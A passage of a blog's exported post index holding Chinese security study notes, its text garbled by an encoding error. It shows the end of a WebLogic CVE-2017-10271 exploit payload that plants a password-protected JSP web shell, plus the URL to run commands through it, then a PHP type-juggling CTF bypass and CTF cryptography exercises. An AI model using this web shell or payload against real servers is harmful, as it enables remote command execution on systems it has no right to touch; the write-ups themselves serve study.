class="line">    if("yakko".equals(request.getParameter("pwd")))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print("&lt;pre&gt;");</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print("&lt;/pre&gt;");</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method="close"/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6t3vgj312c0ian1t.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6t3vgj312c0ian1t.jpg" class="lazyload" title="test"></a></p>
<h2 id="è®¿é—®-shell"><a href="#è®¿é—®-shell" class="headerlink" title="è®¿é—® shell"></a>è®¿é—® shell</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:7001&#x2F;bea_wls_internal&#x2F;test.jsp?pwd&#x3D;yakko&amp;i&#x3D;ls</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pqkzj30kp07rmxd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pqkzj30kp07rmxd.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="æ‰¯ä¸€ä¸‹"><a href="#æ‰¯ä¸€ä¸‹" class="headerlink" title="æ‰¯ä¸€ä¸‹"></a>æ‰¯ä¸€ä¸‹</h1><p>ä¸çŸ¥ä¸è§‰å¼€å­¦äº†ï¼Œæœ¬æ¥è¿˜è¯´è¦å¤šAå‡ é“é¢˜ï¼Œå¤šçœ‹äº›ä¹¦ï¼Œç»“æœ50æ¥å¤©çš„å¯’å‡å°±ç»“æŸäº†ï¼Œæ·¦ï¼Œå•¥éƒ½æ²¡çœ‹ï¼Œæ‘¸é±¼æ‘¸ç€æ‘¸ç€å°±è¦æ¯•ä¸šäº†ï¼Œä¹Ÿæ›¾æ¢¦æƒ³ä»—å‰‘èµ°å¤©æ¶¯ï¼Œç»“æœå‘ç°è‡ªå·±ä»€ä¹ˆæœ¬é¢†éƒ½æ²¡æœ‰ï¼Œåªèƒ½æœ›ç€è¿œæ–¹çš„æ¸è¡Œæ¸è¿œçš„èº«å½±ï¼Œè¿·èŒ«ç€ä¸çŸ¥é“è‡ªå·±è¯¥ä½•å»ä½•ä»ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6plqrj30g40f5767.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6plqrj30g40f5767.jpg" class="lazyload" title="test"></a></p>
<p>å‚è€ƒé“¾æ¥å¦‚ä¸‹<br><a href="https://www.cnblogs.com/xyongsec/archive/2019/07/03/11125511.html" target="_blank" rel="noopener">Weblogic(CVE-2017-10271)æ¼æ´å¤ç°</a><br><a href="https://paper.seebug.org/487/" target="_blank" rel="noopener">Weblogic XMLDecoder RCEåˆ†æ</a><br><a href="https://blog.51cto.com/duallay/1961598" target="_blank" rel="noopener">XMLDecoderååºåˆ—åŒ–æ¼æ´</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»ä¸€é“é¢˜å­¦ä¹ phpçš„å°ç‰¹æ€§</title>
    <url>/yakko117/2020/02/12/php%E5%B0%8F%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>Pç¥ï¼Œæ°¸è¿œæ»´ç¥~ (æŠ–ä¸ªæœºçµï¼‰<br>æ‰‹ä¸Šè¿˜æ”’ç€å‡ ä¸ªé—®é¢˜ï¼Œä¸€ç›´æ²¡æ€ä¹ˆèŠ±æ—¶é—´å»å­¦ä¹ ï¼Œè¦æŠ“ç´§æ—¶é—´äº†</p>
<a id="more"></a>

<h1 id="å®‰æ’-å¥‡æ€ªçš„æé¾™ç‰¹æ€§"><a href="#å®‰æ’-å¥‡æ€ªçš„æé¾™ç‰¹æ€§" class="headerlink" title="[å®‰æ’] å¥‡æ€ªçš„æé¾™ç‰¹æ€§"></a>[å®‰æ’] å¥‡æ€ªçš„æé¾™ç‰¹æ€§</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="é¦–å…ˆå…ˆçœ‹ä¸€ä¸‹pç¥çš„è¯´æ³•"><a href="#é¦–å…ˆå…ˆçœ‹ä¸€ä¸‹pç¥çš„è¯´æ³•" class="headerlink" title="é¦–å…ˆå…ˆçœ‹ä¸€ä¸‹pç¥çš„è¯´æ³•"></a>é¦–å…ˆå…ˆçœ‹ä¸€ä¸‹pç¥çš„è¯´æ³•</h1><pre><code>æˆ‘ä¸€ç›´åœ¨æ€è€ƒï¼Œå‡è®¾æˆ‘æœ‰ä¸€ä¸ªåŠæ³•ï¼Œåœ¨ç¬¬ä¸€æ¬¡WAFæ£€æµ‹å‚æ•°çš„æ—¶å€™ï¼Œæ£€æµ‹çš„æ˜¯22222ï¼Œä½†åé¢è¦†ç›–requestçš„æ—¶å€™ï¼Œæ‹¿åˆ°çš„æ˜¯11111ï¼Œé‚£ä¹ˆä¸å°±å¯ä»¥é€ æˆWAFçš„ç»•è¿‡äº†ä¹ˆï¼Ÿä½†ä¸Šè¿°ä¸¤ä¸ªå®éªŒçš„ç»“æœè¡¨ç¤ºï¼Œæˆ‘è¿™ä¸ªå‡è®¾æ˜¯ä¸æˆç«‹çš„ã€‚äºŒè€…è·å–çš„ç»“æœéƒ½æ˜¯22222 ã€‚é‚£ä¹ˆï¼Œè¿™ä¸ªæ€è·¯æ˜¯å¦å°±æ˜¯ä¸å¯è¡Œçš„äº†ï¼Ÿ</code></pre><p><code>php</code> è‡ªèº«åœ¨è§£æè¯·æ±‚çš„æ—¶å€™ï¼Œå¦‚æœå‚æ•°åå­—ä¸­åŒ…å« <code>&quot; &quot;</code>ã€<code>&quot;.&quot;</code>ã€<code>&quot;[&quot;</code> è¿™å‡ ä¸ªå­—ç¬¦ï¼Œä¼šå°†ä»–ä»¬è½¬æ¢æˆ <code>_</code> ã€‚<br>é‚£ä¹ˆå‡è®¾æˆ‘å‘é€çš„æ˜¯è¿™æ ·ä¸€ä¸ªè¯·æ±‚ï¼š <code>/t.php?user_id=11111&amp;user.id=22222</code> <code>php</code> å…ˆå°† <code>user.id</code> è½¬æ¢æˆ <code>user_id</code> å³ä¸º <code>/t.php?user_id=11111&amp;user_id=22222</code> å†è·å–åˆ°çš„<code>$_REQUEST[&#39;user_id&#39;]</code>å°±æ˜¯22222ã€‚<br>å¯åœ¨ <code>$_SERVER[&#39;REQUEST_URI&#39;]</code> ä¸­ <code>user_id</code> å’Œ<code>user.id</code>å´æ˜¯ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„å‚æ•°åï¼Œåˆ‡å‰²è¦†ç›–åï¼Œè·å–çš„ <code>$_REQUEST[&#39;user_id&#39;]</code> å´æ˜¯ <code>11111</code>ã€‚</p>
<p>ç„¶åå†çœ‹é¢˜ç›®</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åˆ©ç”¨æ•°å­—ç»•è¿‡ï¼šæ•°ç»„æ°¸è¿œæ¯”æ•°å­—å¤§ï¼Œæ°¸è¿œæ¯”æ•°å­—å¤§</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# php -r "@var_dump(admin==0);"</span><br><span class="line">bool(true)</span><br><span class="line">root@kali:~# php -r "var_dump([]&gt;999999999999999999999);"</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬äºŒä¸ªåˆ¤æ–­æ˜¯å¼ºåˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²å†ä¸æ•°å­—æ¯”è¾ƒçš„åˆ¤æ–­</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç®€å•çš„å¼±ç±»å‹ç»•è¿‡äº†ï¼Œè®©å‚æ•°ç­‰äºæŸä¸ªå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼š<code>admin</code> å°±å¯ä»¥äº†ï¼Œå› ä¸º<code>admin== 0</code>ï¼Œç»“æœæ˜¯<code>true</code>ï¼Œç›´æ¥ç­‰äº0ç»•è¿‡ï¼Œæœ€åçš„Payload:</p>
<p><code>?A+A[]=admin</code>w</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFå¯†ç å­¦å…¥é—¨å­¦ä¹ (ä¸€)</title>
    <url>/yakko117/2020/02/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A61/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="å˜å¼‚å‡¯æ’’"><a href="#å˜å¼‚å‡¯æ’’" class="headerlink" title="å˜å¼‚å‡¯æ’’"></a>å˜å¼‚å‡¯æ’’</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åŠ å¯†å¯†æ–‡ï¼šafZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">æ ¼å¼ï¼šflag&#123; &#125;</span><br></pre></td></tr></table></figure></div>

<p>æ—¢ç„¶è¯´æ˜¯å‡¯æ’’å¯†ç ï¼Œå…ˆå°è¯•å¸¸è§„è§£ç ï¼Œä½†å‘ç°æ²¡æœ‰ä¸€ä¸ªæ­£å¸¸çš„è§£ç <br>å› æ­¤è€ƒè™‘è¯»Asciiç </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91ihu2j30r00hlk3r.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91ihu2j30r00hlk3r.jpg" class="lazyload" title="test"></a></p>
<p>é¢˜ç›®å·²ç»æç¤ºå¯†æ–‡æ ¼å¼ä¸º: <code>flag{</code><br>æˆ‘ä»¬å¯¹ç…§ç›¸åº”çš„Asciiç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">f-&gt;</span><span class="bash">102ï¼›l-&gt;108ï¼›a-&gt;97ï¼›g-&gt;103ï¼›&#123;-&gt;123</span></span><br><span class="line"></span><br><span class="line"><span class="meta">a-&gt;</span><span class="bash">97ï¼›f-&gt;102ï¼›Z-&gt;90ï¼›_-&gt;95ï¼›r-&gt;114</span></span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªç›¸å·®5ï¼Œç¬¬äºŒä¸ªç›¸å·®6ï¼Œä»¥æ­¤ç±»æ¨</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gg66j307806ot8m.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gg66j307806ot8m.jpg" class="lazyload" title="test"></a></p>
<p>æœ€åæ„é€ å¦‚ä¸‹è„šæœ¬ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[] = <span class="string">"afZ_r9VYfScOeO_UL^RWUc"</span>;</span><br><span class="line">	<span class="keyword">int</span> CS = <span class="built_in">strlen</span>(a), t; <span class="comment">// è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ </span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CS; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t = a[i];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>, t + i+<span class="number">5</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p>ç„¶ååæ¥ä¹Ÿçœ‹åˆ°æœ‰å¸ˆå‚…æœ‰å…¶ä»–è„šæœ¬</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b_kaisa</span><span class="params">(mstr)</span>:</span></span><br><span class="line">    j = <span class="number">5</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    lmstr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(mstr)):</span><br><span class="line">        m = ord(mstr[i])          <span class="comment"># å°†å¯†æ–‡çš„ç¬¬iä¸ªå­—æ¯å˜ä¸ºå…¶asciiç å€¼</span></span><br><span class="line">        m = m + j                 <span class="comment"># asciiå€¼+j</span></span><br><span class="line">        lmstr.append(m)           <span class="comment"># å°†é€’è¿›åçš„asciiå€¼å­˜å…¥åˆ—è¡¨lmstr[]</span></span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">        j = j+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> lmstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    m_str = <span class="string">'afZ_r9VYfScOeO_UL^RWUc'</span>    <span class="comment"># å¯†æ–‡</span></span><br><span class="line">    lstr = []</span><br><span class="line">    lstr = b_kaisa(m_str)</span><br><span class="line">    <span class="keyword">print</span> lstr</span><br></pre></td></tr></table></figure></div>

<p>è·‘å‡ºæ¥ç»“æœä¸º</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[102, 108, 97, 103, 123, 67, 97, 101, 115, 97, 114, 95, 118, 97, 114, 105, 97, 116, 105, 111, 110, 125]</span><br></pre></td></tr></table></figure></div>

<p>æ”¾åˆ° <code>Asciiè§£ç å™¨</code>ï¼Œå¾—åˆ°çš„ç­”æ¡ˆä¸€æ ·</p>
<hr>
<h1 id="zipä¼ªåŠ å¯†"><a href="#zipä¼ªåŠ å¯†" class="headerlink" title="zipä¼ªåŠ å¯†"></a>zipä¼ªåŠ å¯†</h1><p>å‚è€ƒæ–‡çŒ®å¦‚ä¸‹ï¼š<br><a href="https://blog.csdn.net/wclxyn/article/details/7288994" target="_blank" rel="noopener">ä¸€ä¸ªzipæ–‡ä»¶ç”±è¿™æ ·ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ</a><br><a href="https://blog.csdn.net/qq_26187985/article/details/83654197" target="_blank" rel="noopener">zipä¼ªåŠ å¯†åŸç†åŠæ“ä½œ</a></p>
<p>é€šè¿‡winhex æ‰“å¼€æ–‡ä»¶</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91frovj30me084aam.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91frovj30me084aam.jpg" class="lazyload" title="test"></a></p>
<p>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š<br><code>50 4B 01 02</code>ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°</p>
<p><code>00 00</code>ï¼šå‹ç¼©ä½¿ç”¨çš„ç‰ˆæœ¬<br><code>14 00</code>ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬<br><code>00 00</code>ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œè¿™ä¸ªæ›´æ”¹è¿™é‡Œè¿›è¡Œä¼ªåŠ å¯†ï¼Œæ”¹ä¸º <code>09 00</code> æ‰“å¼€å°±ä¼šæç¤ºæœ‰å¯†ç äº†ï¼‰</p>
<p>å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿— ï¼š<code>50 4B 05 06</code></p>
<p>é¦–å…ˆå…ˆæŸ¥æ‰¾ <code>504B</code>ï¼Œç‚¹å‡»ç¬¬äºŒä¸ª<code>504B</code>ï¼ˆå‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼‰</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91hcdrj30i006ojrs.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91hcdrj30i006ojrs.jpg" class="lazyload" title="test"></a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gseyj30oj0cagmm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gseyj30oj0cagmm.jpg" class="lazyload" title="test"></a></p>
<p>ä¿®æ”¹åå°±å¯ä»¥å¾—åˆ°flagäº†ï¼ˆä¸Šé¢è¿˜æœ‰ä¸€ä¸ª <code>09 00</code> ä¹Ÿè¦æ”¹ï¼‰</p>
<hr>
<h1 id="basic-RSA"><a href="#basic-RSA" class="headerlink" title="basic_RSA"></a>basic_RSA</h1><p><a href="http://buuoj.cn/files/b37f7f440149a3ac517deed5849bc529/70a2f2f0-d422-4cda-a92b-3c48eb9a0fbd.zip" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p>
<p>é¢˜ç›®å†…å®¹:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">åœ¨ä¸€æ¬¡RSAå¯†é’¥å¯¹ç”Ÿæˆä¸­ï¼Œå‡è®¾p=<span class="number">473398607161</span>ï¼Œq=<span class="number">4511491</span>ï¼Œe=<span class="number">17</span></span><br><span class="line">æ±‚è§£å‡ºdä½œä¸ºflagæäº¤</span><br></pre></td></tr></table></figure></div>

<h2 id="RSA-ç®—æ³•"><a href="#RSA-ç®—æ³•" class="headerlink" title="RSA ç®—æ³•"></a>RSA ç®—æ³•</h2><h3 id="é¦–å…ˆéšæœºæ‰¾ä¸¤ä¸ªè´¨æ•°-P-å’Œ-Q-P-ä¸-Q-è¶Šå¤§ï¼Œè¶Šå®‰å…¨"><a href="#é¦–å…ˆéšæœºæ‰¾ä¸¤ä¸ªè´¨æ•°-P-å’Œ-Q-P-ä¸-Q-è¶Šå¤§ï¼Œè¶Šå®‰å…¨" class="headerlink" title="é¦–å…ˆéšæœºæ‰¾ä¸¤ä¸ªè´¨æ•° P å’Œ Q ,P ä¸ Q è¶Šå¤§ï¼Œè¶Šå®‰å…¨"></a>é¦–å…ˆéšæœºæ‰¾ä¸¤ä¸ªè´¨æ•° <code>P</code> å’Œ <code>Q</code> ,<code>P</code> ä¸ <code>Q</code> è¶Šå¤§ï¼Œè¶Šå®‰å…¨</h3><p>å…¬é’¥ <code>n = P*Q</code>ï¼Œå…¶ä¸­ <code>P</code> å’Œ <code>Q</code> æ˜¯ä¸¤ä¸ªå¤§ç´ æ•°</p>
<h3 id="ç„¶åè®¡ç®—-n-çš„æ¬§æ‹‰å‡½æ•°-Ï†-n-ã€‚"><a href="#ç„¶åè®¡ç®—-n-çš„æ¬§æ‹‰å‡½æ•°-Ï†-n-ã€‚" class="headerlink" title="ç„¶åè®¡ç®— n çš„æ¬§æ‹‰å‡½æ•° Ï†(n)ã€‚"></a>ç„¶åè®¡ç®— <code>n</code> çš„æ¬§æ‹‰å‡½æ•° <code>Ï†(n)</code>ã€‚</h3><p><code>Ï†(n)</code> è¡¨ç¤ºåœ¨å°äºç­‰äº <code>n</code> çš„æ­£æ•´æ•°ä¹‹ä¸­ï¼Œä¸ <code>n</code> æ„æˆäº’è´¨å…³ç³»çš„æ•°çš„ä¸ªæ•°ã€‚<br>ä¾‹å¦‚ï¼šåœ¨ 1 åˆ° 8 ä¹‹ä¸­ï¼Œä¸ 8 å½¢æˆäº’è´¨å…³ç³»çš„æ˜¯1ã€3ã€5ã€7ï¼Œæ‰€ä»¥ <code>Ï†(n)=4</code>ã€‚</p>
<p>å¦‚æœ <code>n = P*Q</code>ï¼Œ<code>P</code> ä¸ <code>Q</code> å‡ä¸ºè´¨æ•°ï¼Œåˆ™ <code>m = Ï†(n) = (p-1)*(q-1)</code></p>
<h3 id="ç„¶åéšæœºé€‰æ‹©çš„æ•°-eï¼Œä½œä¸ºå…¬é’¥"><a href="#ç„¶åéšæœºé€‰æ‹©çš„æ•°-eï¼Œä½œä¸ºå…¬é’¥" class="headerlink" title="ç„¶åéšæœºé€‰æ‹©çš„æ•° eï¼Œä½œä¸ºå…¬é’¥"></a>ç„¶åéšæœºé€‰æ‹©çš„æ•° <code>e</code>ï¼Œä½œä¸ºå…¬é’¥</h3><p>æ¡ä»¶æ˜¯ <code>1 &lt; e &lt; m</code>ï¼Œä¸” <code>e</code> ä¸ <code>m</code> äº’è´¨ã€‚</p>
<h3 id="æœ‰ä¸€ä¸ªæ•´æ•°-dï¼Œå¯ä»¥ä½¿å¾—-e-d-é™¤ä»¥-m-çš„ä½™æ•°ä¸º-1"><a href="#æœ‰ä¸€ä¸ªæ•´æ•°-dï¼Œå¯ä»¥ä½¿å¾—-e-d-é™¤ä»¥-m-çš„ä½™æ•°ä¸º-1" class="headerlink" title="æœ‰ä¸€ä¸ªæ•´æ•° dï¼Œå¯ä»¥ä½¿å¾— e*d é™¤ä»¥ m çš„ä½™æ•°ä¸º 1"></a>æœ‰ä¸€ä¸ªæ•´æ•° dï¼Œå¯ä»¥ä½¿å¾— e*d é™¤ä»¥ m çš„ä½™æ•°ä¸º 1</h3><p><code>d</code> æ˜¯è·Ÿ <code>e</code> æœ‰å…³çš„ä¸€ä¸ªæ•°ï¼Œæ»¡è¶³æ¡ä»¶å¼ï¼š<code>e*d=1(mod Ï†(n))</code></p>
<h2 id="åæ¨æ±‚d"><a href="#åæ¨æ±‚d" class="headerlink" title="åæ¨æ±‚d"></a>åæ¨æ±‚d</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">d=gmpy2.invert(e,(q<span class="number">-1</span>)*(p<span class="number">-1</span>))</span><br><span class="line"><span class="keyword">print</span> (d)</span><br></pre></td></tr></table></figure></div>

<p>å› ä¸ºå«Œè£…vc14.0 éº»çƒ¦ï¼Œæ‰€ä»¥ç›´æ¥å»å¯¼å…¥ <code>gmpy2</code> çš„whlåŒ…<br><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs" target="_blank" rel="noopener">å¼•ç”¨åº“ç½‘ç«™åœ°å€</a><br>æˆ‘ç”¨çš„æ˜¯ <code>py3.8</code> 32ä½çš„åŒ…ï¼Œè‡ªå·±å¯ä»¥å»æ‰¾åˆ°åˆé€‚è‡ªå·±pyç‰ˆæœ¬çš„å®‰è£…</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install C:\Users\Manayakko\Desktop\gmpy2-2.0.8-cp38-cp38-win32.whl</span><br></pre></td></tr></table></figure></div>

<hr>
